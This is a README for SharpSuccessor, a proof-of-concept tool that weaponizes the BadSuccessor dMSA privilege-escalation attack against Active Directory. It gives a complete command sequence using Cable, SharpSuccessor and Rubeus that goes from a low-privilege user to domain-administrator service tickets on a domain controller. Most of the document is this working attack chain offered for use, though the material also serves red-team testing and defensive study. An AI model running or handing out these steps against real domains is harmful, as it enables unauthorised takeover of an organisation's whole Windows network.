# SharpSuccessor

SharpSuccessor is a .NET Proof of Concept (POC) for fully weaponizing Yuval Gordon’s ([@YuG0rd](https://x.com/YuG0rd)) [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) attack from Akamai. A low privilege user with `CreateChild` permissions over any Organizational Unit (OU) in the Active Directory domain can escalate privileges to domain administrator.

From low-privilege user context, first create a computer object with a tool such as [Cable](https://github.com/logangoins/Cable):
```
Cable.exe computer /add /name:attacker_computer /password:P@ssw0rd
```
![image](https://github.com/user-attachments/assets/7c2293bb-bbc3-46dd-bfbb-63b2a59e5766)

Then use SharpSuccessor to add and weaponize the dMSA object:
```
SharpSuccessor.exe add /target:Administrator /path:"ou=test,dc=lab,dc=lan" /computer:attacker_computer$ /name:attacker_dMSA
```
![image](https://github.com/user-attachments/assets/294efe2a-3fe0-496e-89e7-bff7e3ed8e36)

Finally use the previously created computer account to request a ticket as the dMSA. First requesting a TGT for the computer account:

```
Rubeus.exe asktgt /user:attacker_computer$ /password:P@ssw0rd /enctype:aes256 /opsec /nowrap
```
![image](https://github.com/user-attachments/assets/2adf8327-dcbd-4d7b-a781-e2a95946c8fb)

Then use that tgt to impersonate the dMSA account:
```
Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/lab.lan /opsec /dmsa /nowrap /ptt /ticket:doIF0DCCBcy...
```
![image](https://github.com/user-attachments/assets/7ee8cac1-70d3-40fb-85c3-740b86761ffb)

Now you can request a service ticket with Administrator context for any SPN, including the Domain Controllers for post-exploitation. For example here I will show admin privileges for SMB on the domain controller:

```
Rubeus.exe asktgs /user:attacker_dmsa$ /service:cifs/WIN-RAEAN26UGJ5.lab.lan /opsec /dmsa /nowrap /ptt /ticket:doIF2DCCBdS...
```
![image](https://github.com/user-attachments/assets/f4799c6d-ef21-4fbc-af2d-2fd900545937)

Now that we have the ticket in memory, we can test access:

![image](https://github.com/user-attachments/assets/6838bb98-5b7a-406a-a889-9e9236a3428f)

